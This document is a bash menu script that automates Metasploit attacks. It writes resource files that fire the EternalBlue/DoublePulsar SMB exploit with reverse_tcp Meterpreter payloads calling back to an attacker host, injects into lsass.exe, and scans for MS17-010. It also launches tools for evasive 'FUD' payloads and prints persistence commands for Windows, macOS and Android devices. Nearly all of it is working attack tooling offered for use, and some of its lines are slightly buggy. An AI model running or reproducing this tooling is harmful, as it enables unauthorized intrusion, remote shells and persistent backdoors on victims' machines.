#!/bin/bash
# etc etc etc
# ..................
#prerequisites : eternalblue_doublePulsar script eternal_scanner Venom PhantomEvasion armitage metasploit
#Path : change the path to your tool location.mine is /opt  
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep postgresql > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service postgresql start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mFiles saved to Current Folder \E[1;33m::::::::::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automation script \E[1;33m:::::::::::::::"
echo -e "\e[97m                      ______
                   .-        -.
                  /            \                Modified By J@M@L
     \e[94m* \e[97m                   \e[90m* \e[97m
                 |,  .-.  .-.  ,|        \e[32m* \e[97m
                 | )(_ /  \_ )( |
                 |/     /\     \|    \e[34m* \e[97m
       (@_       <__    ^^    __>         \e[95m* \e[97m
  _     ) \_______\__|IIIIII|__/____________\e[31m___________ \e[97m
 (_)\e[31m@8@8\e[97m{}<________\e[31m_____\e[97m_____________\e[31m___________________> \e[97m
        )_/         \ IIIIII /                    \e[31m::::: \e[97m
       (@            --------                        \e[31m:: \e[97m
        "
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::\e[97m[1] \e[90mEternalBlue       \e[97m [For Windows X86_64Bits]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mCreate   	 \e[97m [FUD Exploit Venom/phantomEvasion/Msfconsole]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[3] \e[34mScanner      	 \e[97m [Scan EternalBlue_DoublePulsar]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence       \e[97m [Forge a Persistence script] \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[5] \e[31mArmitage          \e[97m [Launch Armitage GUI]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[X] \e[32m    		 \e[97m [Sow Logo]   \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mScript Version 1.0 \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"

PS3='Enter your choice : '
options=("Windows_x86" "Windows_x64" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows_x86")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            touch config.rc
			echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
			echo set RHOST $userport >> config.rc
			echo set TARGETARCHITECTURE x86 >> config.rc
			echo set PROCESSINJECT explorer.exe  >> config.rc
			echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
			echo set LHOST $uservar >> config.rc
			echo set AutoRunScript post/windows/manage/migrate
			echo set ExitOnSession false >> config.rc
			echo set EXITFUNC thread >> config.rc
				echo exploit -j >> config.rc
				xterm -e msfconsole -r config.rc
            echo -e "\E[1;33m::::: \e[97mListener File  saved to current Folder\E[1;33m:::::"
            ;;
        "Windows_x64")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set Target IP: ' userport
				touch config.rc
			echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
			echo set RHOST $userport >> config.rc
			echo set TARGETARCHITECTURE x64 >> config.rc
			echo set PROCESSINJECT lsass.exe  >> config.rc
			echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
			echo set LHOST $uservar >> config.rc
			echo set AutoRunScript post/windows/manage/migrate
			echo set ExitOnSession false >> config.rc
			echo set EXITFUNC thread >> config.rc
				echo exploit -j >> config.rc
				xterm -e msfconsole -r config.rc
            echo -e "\E[1;33m::::: \e[97mListener File  saved to current Folder\E[1;33m:::::"
            ;;   
        "Quit")
            echo "Good Hack" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"

PS3='Enter your choice : '
options=("Venom" "phantomEvasion" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Venom")
			xterm -e /opt/venom/venom.sh
            ;;
        "phantomEvasion")
			xterm -e /opt/Phantom-evasion/phantom-evasion.py
            ;;
        "Quit")
            echo "Good Hack" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
echo -e "\E[1;33m::::: \e[97mStarting Scanner \E[1;33m:::::"

PS3='Enter your choice : '
options=("Metasploit_Scanner" "Eternal_Scan" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Metasploit_Scanner")
			read -p 'Set Target IP To Scan: ' userport
		touch scan.rc
		echo use auxiliary/scanner/smb/smb_ms17_010 >>scan.rc
		echo set RHOSTS $userport >>scan.rc
		echo exploit  >> scan.rc
		xterm -e msfconsole -r scan.rc
            ;;
         "Eternal_Scan")
            xterm -e /opt/eternal_scanner/escan
            ;;   
        "Quit")
            echo "Good Hack" && break
            ;;
        *) echo invalid option;;
    esac
done
;;
  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
 PS3='Enter your choice : '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userpor
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p 4444 -r $uservar\E[1;33m:::::"
            ;;
        "Linux")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "Android")
            touch ~/Desktop/temp/android.sh
            echo \#\!/bin/bash >> ~/Desktop/temp/android.sh
            echo while : >> ~/Desktop/temp/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~./android.sh
            echo sleep 20 >> ~/Desktop/temp/android.sh
            echo done >> ~/Desktop/temp/android.sh
            cat ~/Desktop/temp/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to Current Folder. Upload to / on device\E[1;33m:::::" 
            ;;  
        "Quit")
            echo "Good Hack" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

 "x" | "x" )
 clear

printf "     ____.           _____           .____     
    |    |_____     /     \  _____   |    |    
    |    |\__  \   /  \ /  \ \__  \  |    |    
/\__|    | / __ \_/    Y    \ / __ \_|    |___ 
\________|(____  /\____|__  /(____  /|_______ \
			          \/         \/      \/         \/
 "
;;

          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
